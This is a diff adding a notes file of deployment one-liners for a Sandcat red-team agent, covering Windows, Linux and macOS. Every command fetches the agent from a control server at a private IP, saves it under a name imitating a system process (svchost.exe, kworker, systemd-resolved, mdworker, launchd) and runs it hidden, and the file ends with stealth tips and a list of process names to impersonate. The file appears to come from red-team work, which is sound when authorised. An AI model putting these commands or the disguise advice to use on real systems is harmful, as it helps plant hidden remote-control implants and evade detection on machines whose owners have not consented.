@@ -1,0 +1,58 @@
+# Sandcat Deployment - Platform-Specific Masquerading
+# Updated: December 2025
+
+## WINDOWS - svchost.exe
+# Standard HTTP deployment
+$server="http://192.168.124.133:8888";$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\svchost.exe"} | stop-process -f;rm -force "C:\Users\Public\svchost.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\svchost.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\svchost.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+# HTTPS deployment
+$server="https://192.168.124.133";$url="$server/file/download";[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$data=$wc.DownloadData($url);get-process | ? {$_.modules.filename -like "C:\Users\Public\svchost.exe"} | stop-process -f;rm -force "C:\Users\Public\svchost.exe" -ea ignore;[io.file]::WriteAllBytes("C:\Users\Public\svchost.exe",$data) | Out-Null;Start-Process -FilePath C:\Users\Public\svchost.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+## LINUX - systemd-networkd (network daemon masquerading)
+# Standard deployment
+server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/.systemd-networkd; chmod +x /tmp/.systemd-networkd; nohup /tmp/.systemd-networkd -server $server -group red &
+
+# Alternative: kworker (kernel worker thread - very stealthy)
+server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /tmp/kworker; chmod +x /tmp/kworker; nohup /tmp/kworker -server $server -group red &
+
+# Alternative: systemd (init system - extremely stealthy)
+server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > /usr/local/bin/systemd-resolved; chmod +x /usr/local/bin/systemd-resolved; nohup /usr/local/bin/systemd-resolved -server $server -group red &
+
+## MACOS/DARWIN - mdworker (Spotlight indexer)
+# Standard deployment
+server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > /tmp/mdworker; chmod +x /tmp/mdworker; nohup /tmp/mdworker -server $server -group red &
+
+# ARM64 (M1/M2 Macs)
+server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download > /tmp/mdworker; chmod +x /tmp/mdworker; nohup /tmp/mdworker -server $server -group red &
+
+# Alternative: launchd (macOS init system)
+server="http://192.168.124.133:8888"; curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > /Library/LaunchDaemons/.launchd; chmod +x /Library/LaunchDaemons/.launchd; nohup /Library/LaunchDaemons/.launchd -server $server -group red &
+
+## STEALTH TIPS:
+# Windows - Hide in System32 or AppData
+# Linux   - Use hidden files (. prefix) or /var/tmp
+# macOS   - Use Library folders or hidden files
+
+## COMMON LEGITIMATE PROCESS NAMES BY PLATFORM:
+
+### Windows:
+- svchost.exe (Windows service host)
+- RuntimeBroker.exe (Win10+ process)
+- MicrosoftEdgeUpdate.exe (Edge updater)
+- GoogleUpdateTaskMachine.exe (Chrome updater)
+- OneDriveStandaloneUpdater.exe (OneDrive)
+
+### Linux:
+- systemd (init system)
+- systemd-networkd (network manager)
+- systemd-resolved (DNS resolver)
+- kworker (kernel worker)
+- rsyslogd (syslog daemon)
+- networkd-dispatcher (network events)
+
+### macOS:
+- mdworker (Spotlight indexing)
+- launchd (init system)
+- cloudd (iCloud daemon)
+- com.apple.SecurityAgent (security)
+- softwareupdated (updater)
